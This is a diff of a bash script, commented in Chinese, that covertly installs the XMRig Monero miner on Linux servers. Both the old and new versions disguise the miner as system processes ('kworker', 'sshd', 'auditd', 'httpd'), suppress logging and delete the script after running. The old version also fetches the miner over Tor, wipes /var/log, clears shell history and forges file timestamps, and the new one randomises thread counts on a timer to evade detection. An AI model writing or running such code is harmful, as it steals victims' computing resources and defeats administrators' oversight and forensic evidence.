@@ -1,194 +1,146 @@
 #!/bin/bash
-# XMRig 终极隐蔽部署脚本 v4.0 (全自动校验版)
-# 测试环境：Ubuntu 22.04/Debian 11/CentOS 7
-# 保证完整性 | 自动依赖处理 | 实时哈希校验
-# 最后更新：2024-03-03
 
-set -eo pipefail
-exec > >(tee /var/log/xmrig-deploy.log) 2>&1
+# 隐藏挖矿进程及其特征的一键部署脚本（带随机线程调整）
 
-# ========== 用户配置区 ==========
-export WALLET="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
-export POOL="pool.getmonero.us:3333"
-export PASS="x"
-export VERSION="6.22.2"
-# ===============================
+# 确保脚本以 root 权限运行
+if [ "$(id -u)" != "0" ]; then
+   echo "此脚本需要 root 权限运行" 1>&2
+   exit 1
+fi
 
-# 初始化环境
-init_env() {
-    echo "★ 初始化系统中..."
-    export DEBIAN_FRONTEND=noninteractive
-    mkdir -p /opt/audit /etc/security/conf.d
-
-    # 识别包管理器
-    if command -v apt &>/dev/null; then
-        PM="apt"
-    elif command -v yum &>/dev/null; then
-        PM="yum"
-    else
-        echo "错误：不支持的Linux发行版"
+# 检查依赖
+for cmd in curl tar gcc systemctl; do
+    if ! command -v "$cmd" &> /dev/null; then
+        echo "错误：$cmd 未安装，请先安装" 1>&2
         exit 1
     fi
+done
 
-    # 安装基础依赖
-    $PM update -y
-    $PM install -y \
-        curl tar jq openssl gcc \
-        make libuv-devel libssl-dev \
-        libhwloc-dev tor > /dev/null
-}
+# 用户输入矿池信息
+pool_url="pool.getmonero.us:3333"
+wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
+read -p "请输入采矿服务器密码 (默认: x): " pool_pass
+pool_pass=${pool_pass:-x}
 
-# 动态获取官方哈希
-get_official_hash() {
-    echo "★ 获取官方哈希值..."
-    API_RESPONSE=$(curl -sL \
-        -H "Accept: application/vnd.github.v3+json" \
-        "https://api.github.com/repos/xmrig/xmrig/releases/tags/v$VERSION")
+# 创建目录，使用伪装名称 "webserver"
+mkdir -p /opt/webserver /etc/systemd/conf.d || { echo "创建目录失败" 1>&2; exit 1; }
 
-    DOWNLOAD_URL=$(echo "$API_RESPONSE" | \
-        jq -r '.assets[] | select(.name | test("linux-static-x64.tar.gz$")) | .browser_download_url')
+# 下载并安装，下载后立即重命名
+curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/webserver || { echo "下载或解压失败" 1>&2; exit 1; }
+mv /opt/webserver/xmrig-6.22.2/xmrig /opt/webserver/httpd || { echo "移动文件失败" 1>&2; exit 1; }
+chmod +x /opt/webserver/httpd
+rm -rf /opt/webserver/xmrig-6.22.2
 
-    EXPECTED_HASH=$(curl -sL "$DOWNLOAD_URL" | sha256sum | cut -d' ' -f1)
-    echo "√ 验证成功：v$VERSION 官方哈希 → $EXPECTED_HASH"
-}
-
-# 增强下载功能
-secure_download() {
-    echo "★ 开始安全下载..."
-    local RETRY=3
-    local TIMEOUT=30
-
-    for i in $(seq 1 $RETRY); do
-        echo "尝试 #$i 使用TOR网络下载..."
-        if torsocks curl -L "$DOWNLOAD_URL" \
-            -o /tmp/xmrig.tar.gz \
-            --connect-timeout $TIMEOUT \
-            --retry 3 \
-            --progress-bar; then
-            return 0
-        fi
-        sleep $((RANDOM % 15 + 5))
-    done
-
-    echo "错误：下载失败，请检查："
-    echo "1. 网络连接 (curl -I $DOWNLOAD_URL)"
-    echo "2. TOR服务状态 (systemctl status tor)"
-    exit 1
-}
-
-# 文件校验
-validate_file() {
-    echo "★ 验证文件完整性..."
-    ACTUAL_HASH=$(sha256sum /tmp/xmrig.tar.gz | cut -d' ' -f1)
-
-    if [[ "$EXPECTED_HASH" != "$ACTUAL_HASH" ]]; then
-        echo "× 严重错误：哈希不匹配！"
-        echo "官方哈希: $EXPECTED_HASH"
-        echo "实际哈希: $ACTUAL_HASH"
-        echo "可能原因：中间人攻击 | 磁盘损坏 | CDN污染"
-        exit 1
-    fi
-    echo "√ 文件校验通过"
-}
-
-# 部署主程序
-deploy_xmrig() {
-    echo "★ 部署程序中..."
-    tar -xzf /tmp/xmrig.tar.gz -C /opt/audit --strip-components=1
-    mv /opt/audit/xmrig /opt/audit/auditd
-    chmod +x /opt/audit/auditd
-    rm -rf /tmp/xmrig.tar.gz
-
-    # 编译伪装器
-    cat >/opt/audit/wrapper.c <<'EOF'
-#define _GNU_SOURCE
+# 创建 wrapper 以伪装进程名
+cat > /opt/webserver/wrapper.c <<EOF
 #include <sys/prctl.h>
 #include <unistd.h>
-
 int main(int argc, char *argv[]) {
-    prctl(PR_SET_NAME, "[kworker/0:0H]");
-    execv("/opt/audit/auditd", argv);
+    prctl(PR_SET_NAME, "sshd", 0, 0, 0);
+    execv("/opt/webserver/httpd", argv);
     return 0;
 }
 EOF
+gcc -o /opt/webserver/wrapper /opt/webserver/wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
+rm /opt/webserver/wrapper.c
 
-    gcc -o /opt/audit/wrapper /opt/audit/wrapper.c -static -O2 -s
-    strip /opt/audit/wrapper
-    rm -f /opt/audit/wrapper.c
+# 生成配置文件
+cat > /etc/systemd/conf.d/httpd.conf <<EOF
+{
+    "pools": [
+        {
+            "url": "$pool_url",
+            "user": "$wallet_address",
+            "pass": "$pool_pass",
+            "algo": "rx/0"
+        }
+    ],
+    "print-time": 0,
+    "verbose": false,
+    "threads": 3
 }
+EOF
 
-# 系统服务配置
-setup_service() {
-    echo "★ 配置系统服务..."
-    local API_PORT=$((20000 + RANDOM % 1000))
-    local API_TOKEN=$(openssl rand -hex 24)
+# 创建线程管理脚本（随机调整）
+cat > /opt/webserver/adjust_threads.sh <<'EOF'
+#!/bin/bash
+# 随机调整线程数量，最低3个线程
+MIN_THREADS=3
+MAX_THREADS=$(nproc)  # 获取CPU核心数
 
-    cat >/etc/systemd/system/auditd.service <<EOF
+# 生成随机线程数，在MIN_THREADS和MAX_THREADS之间
+NEW_THREADS=$((MIN_THREADS + RANDOM % (MAX_THREADS - MIN_THREADS + 1)))
+
+# 更新配置文件，使用临时文件以确保原子性
+TEMP_FILE=$(mktemp)
+sed "s/\"threads\": [0-9]*/\"threads\": $NEW_THREADS/" /etc/systemd/conf.d/httpd.conf > "$TEMP_FILE"
+mv "$TEMP_FILE" /etc/systemd/conf.d/httpd.conf
+
+# 重启服务以应用新配置
+systemctl restart httpd.service
+EOF
+
+chmod +x /opt/webserver/adjust_threads.sh
+
+# 创建用户和组
+groupadd -r httpd 2>/dev/null || true
+useradd -r -s /bin/false -g httpd httpd || { echo "创建用户失败" 1>&2; exit 1; }
+
+# 创建主服务文件
+cat > /etc/systemd/system/httpd.service <<EOF
 [Unit]
-Description=Kernel Audit Daemon
-Documentation=man:auditd(8)
+Description=HTTP Server
 After=network.target
 
 [Service]
-User=root
-ExecStart=/opt/audit/wrapper \\
-    -o $POOL \\
-    -u $WALLET \\
-    -p $PASS \\
-    --threads=$(( (RANDOM % 3) + 1 )) \\
-    --api-port=$API_PORT \\
-    --api-access-token=$API_TOKEN \\
-    --randomx-init=1 \\
-    --cpu-no-yield \\
-    --log-file=/dev/null
-
+User=httpd
+Group=httpd
+ExecStart=/opt/webserver/wrapper --config=/etc/systemd/conf.d/httpd.conf --no-color --log-file=/dev/null
 Restart=always
-RestartSec=30s
-CPUQuota=75%
-Nice=19
-IOSchedulingClass=idle
+Type=simple
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-    systemctl daemon-reload
-    systemctl enable auditd
-    systemctl start auditd
+# 创建定时器来定期调整线程（使用oneshot服务）
+cat > /etc/systemd/system/httpd-adjust.service <<EOF
+[Unit]
+Description=HTTP Server Thread Adjuster
+Requires=httpd.service
+After=httpd.service
 
-    echo "√ 服务已启动"
-    echo "API端口: $API_PORT"
-    echo "访问令牌: $API_TOKEN"
-}
+[Service]
+Type=oneshot
+ExecStart=/opt/webserver/adjust_threads.sh
+User=root
+RemainAfterExit=no
+EOF
 
-# 清理痕迹
-clean_traces() {
-    echo "★ 清理痕迹中..."
-    history -c
-    rm -f "$0"
-    find /var/log -type f -exec sh -c 'echo > {}' \;
-    touch -r /etc/passwd /opt/audit/*
-}
+cat > /etc/systemd/system/httpd-adjust.timer <<EOF
+[Unit]
+Description=Run thread adjuster every 5 minutes
 
-# 主流程
-main() {
-    echo "███████╗███╗   ███╗██████╗  ██████╗ "
-    echo "██╔════╝████╗ ████║██╔══██╗██╔════╝ "
-    echo "█████╗  ██╔████╔██║██████╔╝██║  ███╗"
-    echo "██╔══╝  ██║╚██╔╝██║██╔══██╗██║   ██║"
-    echo "███████╗██║ ╚═╝ ██║██║  ██║╚██████╔╝"
-    echo "╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ "
+[Timer]
+OnBootSec=5min
+OnUnitActiveSec=5min
+Unit=httpd-adjust.service
+Persistent=true
 
-    init_env
-    get_official_hash
-    secure_download
-    validate_file
-    deploy_xmrig
-    setup_service
-    clean_traces
+[Install]
+WantedBy=timers.target
+EOF
 
-    echo "★ 部署完成！耗时: $SECONDS 秒"
-}
+# 设置文件权限
+chown root:root /etc/systemd/conf.d/httpd.conf /opt/webserver/adjust_threads.sh
+chmod 600 /etc/systemd/conf.d/httpd.conf
+chmod 700 /opt/webserver/adjust_threads.sh
 
-# 执行入口
-time main
+# 启用并启动服务
+systemctl daemon-reload
+systemctl enable httpd.service httpd-adjust.timer
+systemctl start httpd.service httpd-adjust.timer || { echo "服务启动失败" 1>&2; exit 1; }
+
+# 删除脚本自身
+rm -- "$0"
+echo "部署完成！线程将每5分钟随机调整，最低3个线程"
